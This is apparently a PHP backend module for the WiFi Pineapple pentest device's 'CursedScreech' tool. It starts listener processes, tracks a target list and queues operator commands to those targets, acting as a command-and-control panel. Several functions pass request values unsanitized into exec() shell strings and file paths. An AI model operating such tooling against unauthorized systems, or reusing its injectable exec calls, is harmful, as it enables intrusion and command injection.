<?php

namespace pineapple;
define('__INCLUDES__', "/pineapple/modules/CursedScreech/includes/");
define('__SSLSTORE__', "/pineapple/modules/Papers/includes/ssl/");
define('__FOREST__', __INCLUDES__ . 'forest/');
define('__SETTINGS__', __FOREST__ . 'settings');
define('__SCRIPTS__', __INCLUDES__ . "scripts/");

define('__LOGS__', __INCLUDES__ . "errorlogs/");
define('__HELPFILES__', __INCLUDES__ . "help/");
define('__CHANGELOGS__', __INCLUDES__ . "changelog/");
define('__TARGETS__', __FOREST__ . "targets.log");
define('__TARGETLOGS__', __FOREST__ . "targetlogs/");
define('__COMMANDLOG__', __FOREST__ . "cmd.log");
define('__EZCMDS__', __FOREST__ . "ezcmds");

class CursedScreech extends Module {
	public function route() {
		switch ($this->request->action) {
			case 'loadSettings':
				$this->loadSettings();
				break;
			case 'updateSettings':
				$this->updateSettings($this->request->settings);
				break;
			case 'readLog':
				$this->retrieveLog($this->request->logName, $this->request->type);
				break;
			case 'getLogs':
				$this->getLogs($this->request->type);
				break;
			case 'clearLog':
				$this->clearLog($this->request->logName, $this->request->type);
				break;
			case 'deleteLog':
				$this->deleteLog($this->request->logName);
				break;
			case 'startProc':
				$this->startProc($this->request->procName);
				break;
			case 'procStatus':
				$this->procStatus($this->request->procName);
				break;
			case 'stopProc':
				$this->stopProc($this->request->procName);
				break;
			case 'loadCertificates':
				if (is_dir(__SSLSTORE__)) {
					$this->loadCertificates();
				} else {
					$this->respond(false, "Papers is not installed. Please enter a path to your keys manually.");
				}
				break;
			case 'loadTargets':
				$this->loadTargets();
				break;
			case 'deleteTarget':
				$this->deleteTarget($this->request->target);
				break;
			case 'sendCommand':
				$this->sendCommand($this->request->command, $this->request->targets);
				break;
			case 'downloadLog':
				$this->downloadLog($this->request->logName, $this->request->logType);
				break;
			case 'loadEZCmds':
				$this->loadEZCmds();
				break;
		}
	}
	
	/* ============================ */
	/*      SETTINGS FUNCTIONS      */
	/* ============================ */
	
	private function loadSettings(){
		$configs = array();
		$config_file = fopen(__SETTINGS__, "r");
		if ($config_file) {
			while (($line = fgets($config_file)) !== false) {
				$item = explode("=", $line);
				$key = $item[0]; $val = trim($item[1]);
				$configs[$key] = $val;
			}
		}
		fclose($config_file);
		$this->respond(true, null, $configs);
		return $configs;
	}
	
	private function updateSettings($settings) {
		// Load the current settings from file
		$configs = $this->loadSettings();
		
		// Update the current list.  We do it this so only the requested
		// settings are updated. Probably not necessary but whatevs.
		foreach ($settings as $k => $v) {
			$configs["$k"] = $v;
		}

		// Get the serial number of the target's public cert
		$configs['client_serial'] = exec(__SCRIPTS__ . "getCertSerial.sh " . $configs['target_key'] . ".cer");
		
		// Push the updated settings back out to the file
		$config_file = fopen(__SETTINGS__, "w");
		foreach ($configs as $k => $v) {
			fwrite($config_file, $k . "=" . $v . "\n");
		}
		fclose($config_file);
		
		$this->respond(true);
	}
	
	/* ============================ */
	/*       FOREST FUNCTIONS       */
	/* ============================ */
	
	private function startProc($procName) {
		$cmd = "python " . __FOREST__ . $procName . " > /dev/null 2>&1 &";
		exec($cmd);
		
		// Check if the process is running and return it's PID
		if (($pid = $this->getPID($procName)) != "") {
			$this->respond(true, null, $pid);
			return $pid;
		} else {
			$this->logError("Failed_Process", "The following command failed to execute:<br /><br />" . $cmd);
			$this->respond(false);
			return false;
		}
	}
	
	private function procStatus($procName) {
		if (($status = $this->getPID($procName)) != "") {
			$this->respond(true, null, $status);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function stopProc($procName) {
		// Check if the process is running, if so grab it's PID
		if (($pid = $this->getPID($procName)) == "") {
			$this->respond(true);
			return true;
		}
		
		// Kuro requires a special bullet
		if ($procName == "kuro.py") {
			exec("echo 'killyour:self' >> " . __COMMANDLOG__);
		} else {
			// Kill the process
			exec("kill " . $pid);
		}
		
		// Check one more time if it's still running
		if (($pid = $this->getPID($procName)) == "") {
			$this->respond(true);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function getPID($procName) {
		$data = array();
		exec("pgrep -lf " . $procName, $data);
		$output = explode(" ", $data[0]);
		if (strpos($output[2], $procName) !== False) {
			return $output[0];
		}
		return false;
	}
	
	private function loadEZCmds() {
		$contents = explode("\n", file_get_contents(__EZCMDS__));
		$cmdDict = array();
		foreach ($contents as $line) {
			$cmd = explode(":", $line, 2);
			$name = $cmd[0]; $action = $cmd[1];
			$cmdDict[$name] = $action;
		}
		$this->respond(true, null, $cmdDict);
		return $cmdDict;
	}
	
	private function loadTargets() {
		$targets = array();
		$fh = fopen(__TARGETS__, "r");
		if ($fh) {
			while (($line = fgets($fh)) !== False) {
				array_push($targets, rtrim($line, "\n"));
			}
		} else {
			$this->respond(false, "Failed to open " . __TARGETS__);
			return false;
		}
		fclose($fh);
		$this->respond(true, null, $targets);
		return $targets;
	}
	
	private function deleteTarget($target) {
		$targetFile = explode("\n", file_get_contents(__TARGETS__));
		$key = array_search($target, $targetFile, true);
		if ($key !== False) {
			unset($targetFile[$key]);
		}
		
		$fh = fopen(__TARGETS__, "w");
		fwrite($fh, implode("\n", $targetFile));
		fclose($fh);
		
		$this->respond(true);
		return true;
	}
	
	private function sendCommand($cmd, $targets) {
		if (count($targets) == 0) {
			$this->respond(false);
			return;
		}
		
		$output = "";
		foreach ($targets as $target) {
			$output .= $cmd . ":" . $target . "\n";
		}
		$fh = fopen(__COMMANDLOG__, "w");
		if ($fh) {
			fwrite($fh, $output);
			fclose($fh);
			$this->respond(true);
			return true;
		} else {
			$this->respond(false);
			return false;
		}
	}
	
	private function downloadLog($logName, $type) {
		$dir = ($type == "forest") ? __FOREST__ : (($type == "targets") ? __TARGETLOGS__ : "");
		if (file_exists($dir . $logName)) {
			$this->respond(true, null, $this->downloadFile($dir . $logName));
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	/* ============================ */
	/*         MISCELLANEOUS        */
	/* ============================ */
	
	private function respond($success, $msg = null, $data = null, $error = null) {
		$this->response = array("success" => $success,"message" => $msg, "data" => $data, "error" => $error);
	}
	
	/* ============================ */
	/*         LOG FUNCTIONS        */
	/* ============================ */
	private function getLogs($type) {
		$dir = ($type == "error") ? __LOGS__ : __CHANGELOGS__;
		$contents = array();
		foreach (scandir($dir) as $log) {
			if ($log == "." || $log == "..") {continue;}
			array_push($contents, $log);
		}
		$this->respond(true, null, $contents);
	}
	
	private function retrieveLog($logname, $type) {
		$dir = ($type == "error") ? __LOGS__ : (($type == "help") ? __HELPFILES__ : (($type == "forest") ? __FOREST__ : (($type == "targets") ? __TARGETLOGS__ : __CHANGELOGS__)));
		$data = file_get_contents($dir . $logname);
		if (!$data) {
			$this->respond(true, null, "");
			return;
		}
		$this->respond(true, null, $data);
	}
	
	private function clearLog($log,$type) {
		$dir = ($type == "forest") ? __FOREST__ : (($type == "targets") ? __TARGETLOGS__ : "");
		$fh = fopen($dir . $log, "w");
		fclose($fh);
		$this->respond(true);
	}
	
	private function deleteLog($logname) {
		$data = unlink(__LOGS__ . $logname);
		if (!$data) {
			$this->respond(false, "Failed to delete log.");
			return;
		}
		$this->respond(true);
	}
	
	private function logError($filename, $data) {
		$time = exec("date +'%H_%M_%S'");
		$fh = fopen(__LOGS__ . str_replace(" ","_",$filename) . "_" . $time . ".txt", "w+");
		fwrite($fh, $data);
		fclose($fh);
	}
	
	/* ===================================================== */
	/*         KEY FUNCTIONS TO INTERFACE WITH PAPERS        */
	/* ===================================================== */
	
	private function loadCertificates() {
		$certs = $this->getKeys(__SSLSTORE__);
		$this->respond(true,null,$certs);
	}
	
	private function getKeys($dir) {
		$keyType = "TLS/SSL";
		$keys = scandir($dir);
		$certs = array();
		foreach ($keys as $key) {
			if ($key == "." || $key == "..") {continue;}

			$parts = explode(".", $key);
			$fname = $parts[0];
			$type = "." . $parts[1];

			// Check if the object name already exists in the array
			if ($this->objNameExistsInArray($fname, $certs)) {
				foreach ($certs as &$obj) {
					if ($obj->Name == $fname) {
						$obj->Type .= ", " . $type;
					}
				}
			} else {
				// Add a new object to the array
				$enc = ($this->keyIsEncrypted($fname)) ? "Yes" : "No";
				array_push($certs, (object)array('Name' => $fname, 'Type' => $type, 'Encrypted' => $enc, 'KeyType' => $keyType));
			}
		}
		return $certs;
	}
	
	private function objNameExistsInArray($name, $arr) {
		foreach ($arr as $x) {
			if ($x->Name == $name) {
				return True;
			}
		}
		return False;
	}
	
	private function keyIsEncrypted($keyName) {
		$data = array();
		$keyDir = __SSLSTORE__;
		exec(__SCRIPTS__ . "testEncrypt.sh -k " . $keyName . " -d " . $keyDir . " 2>&1", $data);
		if ($data[0] == "writing RSA key") {
			return false;
		} else if ($data[0] == "unable to load Private Key") {
			return true;
		}
	}
}